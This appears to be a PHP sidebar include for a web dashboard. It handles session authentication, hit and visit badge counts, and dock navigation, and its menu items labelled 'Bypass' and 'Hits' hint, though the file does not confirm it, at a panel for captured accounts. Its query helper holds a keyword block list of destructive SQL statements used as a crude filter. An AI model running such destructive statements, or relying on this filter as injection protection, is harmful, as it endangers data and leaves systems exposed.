<?php
require_once __DIR__ . '/../../libs/auth.php';
ultimaUseAuthCookie();
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        return [];
    }
}
}
if (!function_exists('ultimaAuthenticatedRegular')) {
    function ultimaAuthenticatedRegular()
    {
        static $authenticatedUser = null;
        if (is_array($authenticatedUser)) {
            return $authenticatedUser;
        }
        if (session_status() !== PHP_SESSION_ACTIVE && empty($_SESSION['auth_code'])) {
            session_name('token');
            if (!ultimaUseAuthCookie()) {
                return null;
            }
        }
        if (session_name() !== 'token' || !function_exists('executeSafeQuery')) {
            return null;
        }
        $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
        if ($authCode === '') {
            return null;
        }
        try {
            $rows = executeSafeQuery(
                'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
            return null;
        }
        $row = $rows[0];
        $storedAuthCode = (string)($row['auth_code'] ?? '');
        $resolvedLinkId = (int)($row['link_id'] ?? 0);
        if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $resolvedLinkId <= 0) {
            return null;
        }
        $authenticatedUser = $row;
        return $authenticatedUser;
    }
}

if (!isset($userData) || !is_array($userData)) {
    $userData = ultimaAuthenticatedRegular();
}
if (!is_array($userData)) {
    http_response_code(401);
    exit;
}

$link_id = (int)$userData['link_id'];
$linkId = $link_id;
if (!isset($isTriplehook)) {
    $isTriplehook = (int)($userData['triplehook'] ?? 0) === 1;
} else {
    $isTriplehook = ($isTriplehook === true || $isTriplehook === 1 || $isTriplehook === '1' || (is_string($isTriplehook) && in_array(strtolower(trim((string)$isTriplehook)), ['1','true','yes','on'], true)));
}
$currentPage = $currentPage ?? '';

require_once __DIR__ . '/counts.php';
$totalHits = 0;
$totalVisits = 0;

if (empty($skipSidebarCounts) && isset($userData['link_id'])) {
    $__sid = (int)$userData['link_id'];
    $__thRaw = $isTriplehook ?? ($userData['triplehook'] ?? 0);
    $__thMode = ($__thRaw === true || $__thRaw === 1 || $__thRaw === '1' || (is_string($__thRaw) && in_array(strtolower(trim((string)$__thRaw)), ['1','true','yes','on'], true)) || !empty($isTriplehook));

    $__counts = ultimaSidebarCounts($__sid, $__thMode);
    $totalHits = $__counts['hits'];
    $totalVisits = $__counts['visits'];
}
?>
<style>
.dock-nav{position:fixed;left:0;top:50px;height:calc(100vh - 50px);width:82px;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:1000;padding:20px 0;gap:10px}
.dock-item[data-href="/pages/tools"] i::before{content:none!important;display:none!important}
.dock-item[data-href="/pages/tools"] i.dock-tools-ico{display:flex;align-items:center;justify-content:center}
.dock-item[data-href="/pages/tools"] i.dock-tools-ico svg{display:block}
.dock-item{position:relative;width:56px;height:56px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;background:#0a0a0c;border:none;overflow:visible}
.dock-item.active::after{content:'';position:absolute;right:-4px;top:50%;transform:translateY(-50%);width:3px;height:16px;background:rgba(255,255,255,.4);border-radius:3px}
.dock-item i{font-size:1.22rem;color:rgba(255,255,255,.3)}
.dock-item.active i{color:rgba(255,255,255,.5)}
.dock-ripple{position:absolute;top:50%;left:50%;width:0;height:0;border-radius:50%;background:transparent;border:1.5px solid rgba(255,255,255,.2);transform:translate(-50%,-50%);pointer-events:none;animation:dock-ring .6s ease-out forwards}
@keyframes dock-ring{0%{width:0;height:0;opacity:.6}100%{width:78px;height:78px;opacity:0}}
.dock-progress-track{position:absolute;bottom:-9px;left:50%;transform:translateX(-50%);width:31px;height:2px;border-radius:1px;background:rgba(255,255,255,.04);overflow:hidden;opacity:0;transition:opacity .2s ease}
.dock-progress-track.active{opacity:1}
.dock-progress-bar{width:0;height:100%;border-radius:1px;background:rgba(255,255,255,.25);will-change:width,background-position}
@keyframes dockProgressTravel{0%{width:5%}55%{width:72%}100%{width:92%}}
@keyframes dockProgressShimmer{0%{background-position:0 0}100%{background-position:31px 0}}
.dock-progress-bar.loading{background:linear-gradient(90deg,rgba(255,255,255,.18),rgba(255,255,255,.48),rgba(255,255,255,.18));background-size:31px 100%;animation:dockProgressTravel 9s cubic-bezier(.16,1,.3,1) forwards,dockProgressShimmer .8s linear infinite}
.dock-badge{position:absolute;top:-3px;right:-3px;min-width:19px;height:19px;padding:0 5px;border-radius:9px;background:#0a0a0c;border:1.5px solid rgba(255,255,255,.08);font-size:.62rem;font-weight:600;color:rgba(255,255,255,.4);display:flex;align-items:center;justify-content:center;line-height:1}
.dock-tooltip{position:absolute;left:71px;top:50%;transform:translateY(-50%) scale(.9);background:#0a0a0c;border:1px solid rgba(255,255,255,.06);color:rgba(255,255,255,.5);font-size:.77rem;font-weight:500;padding:6px 12px;border-radius:8px;white-space:nowrap;opacity:0;pointer-events:none;transition:all .25s cubic-bezier(.4,0,.2,1);letter-spacing:.02em}
.dock-item:hover .dock-tooltip{opacity:1;transform:translateY(-50%) scale(1)}
.mobile-dock-btn{display:none;position:fixed;top:16px;left:16px;width:42px;height:42px;border-radius:50%;background:#0a0a0c;border:none;cursor:pointer;z-index:1002;align-items:center;justify-content:center;color:rgba(255,255,255,.3);font-size:1.05rem}
.dock-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);backdrop-filter:blur(4px);z-index:999}
@media(max-width:768px){
    .mobile-dock-btn{display:flex;top:34px;left:16px;width:42px;height:42px;border-radius:50%;z-index:999}
    .dock-nav{transform:translateX(-100%);width:82px;background:#0a0a0c;border-right:1px solid rgba(255,255,255,.04);top:42px;height:calc(100vh - 42px);transition:transform 0.4s cubic-bezier(0.16,1,0.3,1),top 0.4s cubic-bezier(0.16,1,0.3,1),height 0.4s cubic-bezier(0.16,1,0.3,1)}
    .dock-nav.mobile-open{transform:translateX(0);top:0!important;height:100vh!important;z-index:99999!important}
    .dock-overlay{transition:opacity 0.3s ease}
    .dock-overlay.active{display:block;animation:fadeIn 0.3s ease forwards}
}
@keyframes fadeIn{0%{opacity:0}100%{opacity:1}}
@media(max-width:480px){
    .mobile-dock-btn{top:30px;width:38px;height:38px}
    .dock-nav{top:38px;height:calc(100vh - 38px)}
}
@media(max-width:360px){
    .mobile-dock-btn{top:27px;width:36px;height:36px}
    .dock-nav{top:34px;height:calc(100vh - 34px)}
}
</style>
<button class="mobile-dock-btn" id="mobile-menu-btn"><i class="fas fa-bars"></i></button>
<div class="dock-overlay" id="sidebar-overlay"></div>
<nav class="dock-nav" id="sidebar">
    <div class="dock-item <?= $currentPage == 'dashboard' ? 'active' : '' ?>" data-href="/pages/dashboard">
        <i class="fas fa-home"></i>
        <span class="dock-tooltip">Dashboard</span>
        <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
    </div>
    <div class="dock-item <?= $currentPage == 'controller' ? 'active' : '' ?>" data-href="/pages/controller">
        <i class="fas fa-gamepad"></i>
        <span class="dock-tooltip">Controller</span>
        <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
    </div>
    <div class="dock-item <?= $currentPage == 'tools' ? 'active' : '' ?>" data-href="/pages/tools">
        <i class="dock-tools-ico"><svg viewBox="0 0 512 512" width="1.15em" height="1.15em" aria-hidden="true"><path fill="currentColor" d="M466.5 83.7l-192-80a48.15 48.15 0 0 0-36.9 0l-192 80C27.7 91.1 16 108.6 16 128c0 198.5 114.5 335.7 221.5 380.3 11.8 4.9 25.1 4.9 36.9 0C360.1 472.6 496 349.3 496 128c0-19.4-11.7-36.9-29.5-44.3z"/></svg></i>
        <span class="dock-tooltip">Bypass</span>
        <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
    </div>
    <div class="dock-item <?= $currentPage == 'storage' ? 'active' : '' ?>" data-href="/pages/storage">
        <i class="fas fa-user"></i>
        <span class="dock-tooltip">Hits</span>
        <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
        <div class="dock-badge" id="sidebar-hits-badge"<?= $totalHits > 0 ? '' : ' hidden style="display:none"' ?>><?= $totalHits > 0 ? $totalHits : '' ?></div>
    </div>
    <div class="dock-item <?= $currentPage == 'visits' ? 'active' : '' ?>" data-href="/pages/visits">
        <i class="fas fa-eye"></i>
        <span class="dock-tooltip">Visits</span>
        <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
        <div class="dock-badge" id="sidebar-visits-badge"<?= $totalVisits > 0 ? '' : ' hidden style="display:none"' ?>><?= $totalVisits > 0 ? $totalVisits : '' ?></div>
    </div>
</nav>
<script>

(function(){
    function setBadge(el, n){
        if(!el)return;
        var v=parseInt(n,10)||0;
        if(v>0){
            el.textContent=v;
            el.hidden=false;
            el.style.display='';
        } else {
            el.textContent='';
            el.hidden=true;
            el.style.display='none';
        }
    }
    function apply(msg){
        if(!msg||typeof msg!=='object')return;
        if(msg.type!=='sidebar_counts')return;
        setBadge(document.getElementById('sidebar-hits-badge'), msg.hits);
        setBadge(document.getElementById('sidebar-visits-badge'), msg.visits);
        try{
            window.dispatchEvent(new CustomEvent('ultima:sidebar-counts',{detail:{
                hits:parseInt(msg.hits,10)||0,
                visits:parseInt(msg.visits,10)||0,
                views:parseInt(msg.views,10)||0,
                clicks:parseInt(msg.clicks,10)||0
            }}));
        }catch(e){}
    }
    function subscribe(){
        if(!window.ultimaWS||typeof window.ultimaWS.subscribe!=='function'){
            setTimeout(subscribe,50);return;
        }
        window.ultimaWS.subscribe('sidebar', apply);
    }
    if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',subscribe);
    else subscribe();

    function countBadge(el, target){
        if(!el)return;
        var v=parseInt(target,10)||0;
        if(v<=0){setBadge(el,0);return;}
        el.hidden=false;el.style.display='';
        if(el.__cuv===v)return; el.__cuv=v;
        var dur=900,t0=null,from=parseInt(el.textContent,10)||0;
        function step(ts){if(t0===null)t0=ts;var p=Math.min(1,(ts-t0)/dur);var e=1-Math.pow(1-p,3);el.textContent=String(Math.round(from+(v-from)*e));if(p<1)requestAnimationFrame(step);else el.textContent=String(v);}
        requestAnimationFrame(step);
    }
    var loading=false;
    function loadCounts(){
        if(loading)return; loading=true;
        fetch('/api/sidebar-counts.php',{credentials:'same-origin',cache:'no-store',headers:{'X-Soft-Nav':'1'}})
            .then(function(r){return r.json()})
            .then(function(d){
                loading=false;
                if(!d||!d.success)return;
                countBadge(document.getElementById('sidebar-hits-badge'), d.hits);
                countBadge(document.getElementById('sidebar-visits-badge'), d.visits);
                try{window.dispatchEvent(new CustomEvent('ultima:sidebar-counts',{detail:{hits:parseInt(d.hits,10)||0,visits:parseInt(d.visits,10)||0}}));}catch(e){}
            })
            .catch(function(){loading=false;});
    }
    if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',loadCounts);
    else loadCounts();
    window.addEventListener('ultima:softnav-complete',function(){setTimeout(loadCounts,150);});
})();
</script>
<script>
(function() {
    var sidebar = document.getElementById('sidebar');
    var mobileBtn = document.getElementById('mobile-menu-btn');
    var overlay = document.getElementById('sidebar-overlay');
    var activeItem = null;
    var navigationTimer = null;
    var isNavigating = false;

    function resetProgress(item) {
        if (!item) return;
        var track = item.querySelector('.dock-progress-track');
        var bar = item.querySelector('.dock-progress-bar');
        if (bar) {
            bar.classList.remove('loading');
            bar.style.width = '0';
        }
        if (track) track.classList.remove('active');
        if (activeItem === item) activeItem = null;
    }

    function startProgress(item) {
        if (activeItem && activeItem !== item) resetProgress(activeItem);
        activeItem = item;
        var track = item.querySelector('.dock-progress-track');
        var bar = item.querySelector('.dock-progress-bar');
        if (!track || !bar) return;
        bar.classList.remove('loading');
        bar.style.width = '0';
        void bar.offsetWidth;
        track.classList.add('active');
        bar.classList.add('loading');
    }

    function closeMobileDock() {
        if (window.innerWidth > 768) return;
        sidebar.classList.remove('mobile-open');
        overlay.classList.remove('active');
        if (mobileBtn) mobileBtn.style.display = 'flex';
        var header = document.getElementById('triplehookHeader');
        if (header) header.style.zIndex = '10000';
    }

    document.querySelectorAll('.dock-item').forEach(function(item) {
        item.addEventListener('click', function() {
            var href = this.getAttribute('data-href');
            if (!href) return;
            if (href === location.pathname && !isNavigating) { resetProgress(this); return; }

            isNavigating = true;
            startProgress(this);
            closeMobileDock();

            var used = false;
            try {
                used = (typeof window.ultimaSoftGo === 'function') && window.ultimaSoftGo(href);
            } catch (e) { used = false; }
            if (!used) {
                setTimeout(function() { window.location.assign(href); }, 80);
            }
            clearTimeout(navigationTimer);
            navigationTimer = setTimeout(function() {
                resetProgress(item);
                isNavigating = false;
            }, 10000);
        });
    });

    window.addEventListener('popstate', function() {
        document.querySelectorAll('.dock-item').forEach(resetProgress);
        isNavigating = false;
    });

    window.addEventListener('ultima:softnav-complete', function() {
        clearTimeout(navigationTimer);
        isNavigating = false;
        var path = location.pathname;
        document.querySelectorAll('.dock-item').forEach(function(it) {
            resetProgress(it);
            var href = it.getAttribute('data-href');
            if (href) it.classList.toggle('active', href === path);
        });
    });

    window.addEventListener('pagehide', function() { clearTimeout(navigationTimer); });
    window.addEventListener('pageshow', function() {
        clearTimeout(navigationTimer);
        document.querySelectorAll('.dock-item').forEach(resetProgress);
        isNavigating = false;
    });

    if (mobileBtn) {
        mobileBtn.addEventListener('click', function() {
            sidebar.classList.toggle('mobile-open');
            overlay.classList.toggle('active');
            var icon = this.querySelector('i');
            mobileBtn.style.display = sidebar.classList.contains('mobile-open') ? 'none' : 'flex';
            var header = document.getElementById('triplehookHeader');
            if(header) header.style.zIndex = sidebar.classList.contains('mobile-open') ? '1' : '10000';
        });
    }
    if (overlay) {
        overlay.addEventListener('click', function() {
            sidebar.classList.remove('mobile-open');
            overlay.classList.remove('active');
            mobileBtn.style.display = 'flex';
            var header = document.getElementById('triplehookHeader');
            if(header) header.style.zIndex = '10000';
        });
    }
})();
</script>
